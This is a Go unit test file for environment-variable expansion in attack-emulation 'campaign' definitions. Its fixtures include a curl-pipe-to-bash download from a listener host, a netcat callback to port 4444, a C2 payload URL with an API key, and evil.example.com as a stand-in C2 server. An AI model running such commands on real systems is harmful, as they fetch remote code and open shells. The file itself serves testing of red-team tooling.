// Copyright (c) 2024-2026 ThreatEcho. All rights reserved.
// SPDX-License-Identifier: AGPL-3.0-only
// https://threatecho.com

package campaign

import (
	"testing"
)

// helper builds a minimal campaign with one stage for testing.
func envTestCampaign() *Campaign {
	return &Campaign{
		Variables: map[string]string{},
		Stages: []Stage{
			{
				ID:          "stage-1",
				Name:        "Test Stage",
				Description: "A test stage",
				Technique:   "T1059.001",
				Tactic:      "execution",
				Execute: Execute{
					Type:     "shell",
					Target:   "localhost",
					Payload:  "payload.exe",
					Commands: []string{"echo hello"},
					Cleanup:  []string{"rm -f /tmp/test"},
					Args:     map[string]string{"key": "value"},
				},
				Expect: Expect{
					Telemetry:  []string{"process_create"},
					Detections: []string{"rule_powershell"},
					Artifacts:  []string{"/tmp/artifact"},
					IOCs:       []string{"192.168.1.1"},
				},
			},
		},
	}
}

func TestExpandEnv_BasicExpansion(t *testing.T) {
	t.Setenv("C2_SERVER", "10.0.0.1")

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:C2_SERVER}"

	result := ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Target != "10.0.0.1" {
		t.Errorf("expected target '10.0.0.1', got %q", c.Stages[0].Execute.Target)
	}
	if result.Expanded != 1 {
		t.Errorf("expected 1 expanded, got %d", result.Expanded)
	}
	if len(result.Missing) != 0 {
		t.Errorf("expected no missing, got %v", result.Missing)
	}
}

func TestExpandEnv_MultipleVars(t *testing.T) {
	t.Setenv("C2_SERVER", "10.0.0.1")
	t.Setenv("C2_PORT", "443")
	t.Setenv("API_KEY", "secret123")

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:C2_SERVER}:${env:C2_PORT}"
	c.Stages[0].Execute.Payload = "https://${env:C2_SERVER}/agent?key=${env:API_KEY}"

	result := ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Target != "10.0.0.1:443" {
		t.Errorf("expected '10.0.0.1:443', got %q", c.Stages[0].Execute.Target)
	}
	if c.Stages[0].Execute.Payload != "https://10.0.0.1/agent?key=secret123" {
		t.Errorf("expected expanded payload, got %q", c.Stages[0].Execute.Payload)
	}
	if result.Expanded != 4 {
		t.Errorf("expected 4 expanded, got %d", result.Expanded)
	}
}

func TestExpandEnv_SameVarMultipleLocations(t *testing.T) {
	t.Setenv("TARGET_HOST", "victim.local")

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:TARGET_HOST}"
	c.Stages[0].Name = "Attack ${env:TARGET_HOST}"
	c.Stages[0].Execute.Commands = []string{"ping ${env:TARGET_HOST}"}

	result := ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Target != "victim.local" {
		t.Errorf("target: expected 'victim.local', got %q", c.Stages[0].Execute.Target)
	}
	if c.Stages[0].Name != "Attack victim.local" {
		t.Errorf("name: expected 'Attack victim.local', got %q", c.Stages[0].Name)
	}
	if c.Stages[0].Execute.Commands[0] != "ping victim.local" {
		t.Errorf("command: expected 'ping victim.local', got %q", c.Stages[0].Execute.Commands[0])
	}
	if result.Expanded != 3 {
		t.Errorf("expected 3 expanded, got %d", result.Expanded)
	}
}

func TestExpandEnv_MissingVarStrict(t *testing.T) {
	// Do NOT set MISSING_VAR.
	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:MISSING_VAR}"

	result := ExpandEnv(c, ExpandEnvOptions{AllowMissing: false})

	// Should be left as-is.
	if c.Stages[0].Execute.Target != "${env:MISSING_VAR}" {
		t.Errorf("expected '${env:MISSING_VAR}' unchanged, got %q", c.Stages[0].Execute.Target)
	}
	if result.Expanded != 0 {
		t.Errorf("expected 0 expanded, got %d", result.Expanded)
	}
}

func TestExpandEnv_MissingVarPermissive(t *testing.T) {
	// Do NOT set MISSING_VAR.
	c := envTestCampaign()
	c.Stages[0].Execute.Target = "host-${env:MISSING_VAR}-end"

	result := ExpandEnv(c, ExpandEnvOptions{AllowMissing: true})

	if c.Stages[0].Execute.Target != "host--end" {
		t.Errorf("expected 'host--end', got %q", c.Stages[0].Execute.Target)
	}
	if result.Expanded != 1 {
		t.Errorf("expected 1 expanded (to empty), got %d", result.Expanded)
	}
}

func TestExpandEnv_MissingTracked(t *testing.T) {
	// Do NOT set UNSET_A or UNSET_B.
	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:UNSET_A}"
	c.Stages[0].Execute.Payload = "${env:UNSET_B}"

	result := ExpandEnv(c, ExpandEnvOptions{AllowMissing: false})

	if len(result.Missing) != 2 {
		t.Fatalf("expected 2 missing, got %d: %v", len(result.Missing), result.Missing)
	}
	// Missing is sorted.
	if result.Missing[0] != "UNSET_A" || result.Missing[1] != "UNSET_B" {
		t.Errorf("expected [UNSET_A UNSET_B], got %v", result.Missing)
	}
}

func TestExpandEnv_InCommands(t *testing.T) {
	t.Setenv("LHOST", "10.10.10.10")

	c := envTestCampaign()
	c.Stages[0].Execute.Commands = []string{
		"curl http://${env:LHOST}/shell.sh | bash",
		"nc ${env:LHOST} 4444",
	}

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Commands[0] != "curl http://10.10.10.10/shell.sh | bash" {
		t.Errorf("command[0]: got %q", c.Stages[0].Execute.Commands[0])
	}
	if c.Stages[0].Execute.Commands[1] != "nc 10.10.10.10 4444" {
		t.Errorf("command[1]: got %q", c.Stages[0].Execute.Commands[1])
	}
}

func TestExpandEnv_InTarget(t *testing.T) {
	t.Setenv("TARGET_IP", "192.168.56.101")

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:TARGET_IP}"

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Target != "192.168.56.101" {
		t.Errorf("expected '192.168.56.101', got %q", c.Stages[0].Execute.Target)
	}
}

func TestExpandEnv_InArgs(t *testing.T) {
	t.Setenv("DB_PASSWORD", "s3cret!")

	c := envTestCampaign()
	c.Stages[0].Execute.Args = map[string]string{
		"password": "${env:DB_PASSWORD}",
		"host":     "localhost",
	}

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Args["password"] != "s3cret!" {
		t.Errorf("expected 's3cret!', got %q", c.Stages[0].Execute.Args["password"])
	}
	if c.Stages[0].Execute.Args["host"] != "localhost" {
		t.Errorf("non-env arg should be unchanged, got %q", c.Stages[0].Execute.Args["host"])
	}
}

func TestExpandEnv_InVariables(t *testing.T) {
	t.Setenv("C2_SERVER", "evil.example.com")

	c := envTestCampaign()
	c.Variables["c2_server"] = "${env:C2_SERVER}"
	c.Variables["static"] = "no-env-here"

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Variables["c2_server"] != "evil.example.com" {
		t.Errorf("expected 'evil.example.com', got %q", c.Variables["c2_server"])
	}
	if c.Variables["static"] != "no-env-here" {
		t.Errorf("static variable should be unchanged, got %q", c.Variables["static"])
	}
}

func TestExpandEnv_NoExpansionInStructuralFields(t *testing.T) {
	t.Setenv("INJECT", "injected")

	c := envTestCampaign()
	c.Stages[0].ID = "${env:INJECT}"
	c.Stages[0].Technique = "${env:INJECT}"
	c.Stages[0].Tactic = "${env:INJECT}"
	c.Stages[0].Expect.Telemetry = []string{"${env:INJECT}"}
	c.Stages[0].Expect.Detections = []string{"${env:INJECT}"}

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].ID != "${env:INJECT}" {
		t.Errorf("stage ID should NOT be expanded, got %q", c.Stages[0].ID)
	}
	if c.Stages[0].Technique != "${env:INJECT}" {
		t.Errorf("technique should NOT be expanded, got %q", c.Stages[0].Technique)
	}
	if c.Stages[0].Tactic != "${env:INJECT}" {
		t.Errorf("tactic should NOT be expanded, got %q", c.Stages[0].Tactic)
	}
	if c.Stages[0].Expect.Telemetry[0] != "${env:INJECT}" {
		t.Errorf("telemetry should NOT be expanded, got %q", c.Stages[0].Expect.Telemetry[0])
	}
	if c.Stages[0].Expect.Detections[0] != "${env:INJECT}" {
		t.Errorf("detections should NOT be expanded, got %q", c.Stages[0].Expect.Detections[0])
	}
}

func TestExpandEnv_Escape(t *testing.T) {
	t.Setenv("SECRET", "should_not_appear")

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "$${env:SECRET}"

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Target != "${env:SECRET}" {
		t.Errorf("escaped reference should become literal '${env:SECRET}', got %q", c.Stages[0].Execute.Target)
	}
}

func TestExpandEnv_ExpandedCount(t *testing.T) {
	t.Setenv("A", "1")
	t.Setenv("B", "2")

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:A}"
	c.Stages[0].Execute.Payload = "${env:B}"
	c.Stages[0].Name = "${env:A} and ${env:B}"
	// Total: 4 refs (A in target, B in payload, A in name, B in name).

	result := ExpandEnv(c, ExpandEnvOptions{})

	if result.Expanded != 4 {
		t.Errorf("expected 4 expanded, got %d", result.Expanded)
	}
}

func TestExpandEnv_NilCampaign(t *testing.T) {
	// Must not panic.
	result := ExpandEnv(nil, ExpandEnvOptions{})

	if result == nil {
		t.Fatal("expected non-nil result for nil campaign")
	}
	if result.Expanded != 0 {
		t.Errorf("expected 0 expanded, got %d", result.Expanded)
	}
}

func TestExpandEnv_EmptyCampaign(t *testing.T) {
	c := &Campaign{}

	result := ExpandEnv(c, ExpandEnvOptions{})

	if result.Expanded != 0 {
		t.Errorf("expected 0 expanded, got %d", result.Expanded)
	}
	if len(result.Missing) != 0 {
		t.Errorf("expected no missing, got %v", result.Missing)
	}
}

func TestListEnvRefs_FindsAll(t *testing.T) {
	c := envTestCampaign()
	c.Variables["server"] = "${env:C2_SERVER}"
	c.Stages[0].Execute.Target = "${env:TARGET_IP}"
	c.Stages[0].Execute.Commands = []string{"curl ${env:API_KEY}"}

	refs := ListEnvRefs(c)

	expected := map[string]bool{"C2_SERVER": true, "TARGET_IP": true, "API_KEY": true}
	if len(refs) != 3 {
		t.Fatalf("expected 3 refs, got %d: %v", len(refs), refs)
	}
	for _, r := range refs {
		if !expected[r] {
			t.Errorf("unexpected ref %q", r)
		}
	}
}

func TestListEnvRefs_NoDuplicates(t *testing.T) {
	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:SAME_VAR}"
	c.Stages[0].Name = "target is ${env:SAME_VAR}"
	c.Stages[0].Execute.Commands = []string{"echo ${env:SAME_VAR}"}

	refs := ListEnvRefs(c)

	if len(refs) != 1 {
		t.Errorf("expected 1 unique ref, got %d: %v", len(refs), refs)
	}
	if refs[0] != "SAME_VAR" {
		t.Errorf("expected SAME_VAR, got %q", refs[0])
	}
}

func TestValidateEnvRefs_AllSet(t *testing.T) {
	t.Setenv("HOST_A", "10.0.0.1")
	t.Setenv("HOST_B", "10.0.0.2")

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:HOST_A}"
	c.Stages[0].Execute.Payload = "${env:HOST_B}"

	missing := ValidateEnvRefs(c)

	if len(missing) != 0 {
		t.Errorf("expected no missing, got %v", missing)
	}
}

func TestValidateEnvRefs_SomeMissing(t *testing.T) {
	t.Setenv("PRESENT_VAR", "here")
	// ABSENT_VAR is not set.

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:PRESENT_VAR}"
	c.Stages[0].Execute.Payload = "${env:ABSENT_VAR}"

	missing := ValidateEnvRefs(c)

	if len(missing) != 1 {
		t.Fatalf("expected 1 missing, got %d: %v", len(missing), missing)
	}
	if missing[0] != "ABSENT_VAR" {
		t.Errorf("expected ABSENT_VAR, got %q", missing[0])
	}
}

func TestExpandEnv_InCleanup(t *testing.T) {
	t.Setenv("CLEAN_PATH", "/opt/malware")

	c := envTestCampaign()
	c.Stages[0].Execute.Cleanup = []string{"rm -rf ${env:CLEAN_PATH}"}

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Execute.Cleanup[0] != "rm -rf /opt/malware" {
		t.Errorf("cleanup not expanded, got %q", c.Stages[0].Execute.Cleanup[0])
	}
}

func TestExpandEnv_InArtifactsAndIOCs(t *testing.T) {
	t.Setenv("DROP_DIR", "/tmp/drops")
	t.Setenv("IOC_IP", "198.51.100.1")

	c := envTestCampaign()
	c.Stages[0].Expect.Artifacts = []string{"${env:DROP_DIR}/beacon.exe"}
	c.Stages[0].Expect.IOCs = []string{"${env:IOC_IP}"}

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Expect.Artifacts[0] != "/tmp/drops/beacon.exe" {
		t.Errorf("artifact not expanded, got %q", c.Stages[0].Expect.Artifacts[0])
	}
	if c.Stages[0].Expect.IOCs[0] != "198.51.100.1" {
		t.Errorf("IOC not expanded, got %q", c.Stages[0].Expect.IOCs[0])
	}
}

func TestExpandEnv_InDescription(t *testing.T) {
	t.Setenv("VICTIM", "dc01.corp.local")

	c := envTestCampaign()
	c.Stages[0].Description = "Lateral move to ${env:VICTIM}"

	ExpandEnv(c, ExpandEnvOptions{})

	if c.Stages[0].Description != "Lateral move to dc01.corp.local" {
		t.Errorf("description not expanded, got %q", c.Stages[0].Description)
	}
}

func TestExpandEnv_MixedSetAndMissing(t *testing.T) {
	t.Setenv("SET_VAR", "present")
	// UNSET_VAR is not set.

	c := envTestCampaign()
	c.Stages[0].Execute.Target = "${env:SET_VAR}:${env:UNSET_VAR}"

	result := ExpandEnv(c, ExpandEnvOptions{AllowMissing: false})

	// SET_VAR expanded, UNSET_VAR left as-is.
	if c.Stages[0].Execute.Target != "present:${env:UNSET_VAR}" {
		t.Errorf("expected 'present:${env:UNSET_VAR}', got %q", c.Stages[0].Execute.Target)
	}
	if result.Expanded != 1 {
		t.Errorf("expected 1 expanded, got %d", result.Expanded)
	}
	if len(result.Missing) != 1 || result.Missing[0] != "UNSET_VAR" {
		t.Errorf("expected [UNSET_VAR] missing, got %v", result.Missing)
	}
}

func TestListEnvRefs_NilCampaign(t *testing.T) {
	refs := ListEnvRefs(nil)
	if refs != nil {
		t.Errorf("expected nil for nil campaign, got %v", refs)
	}
}
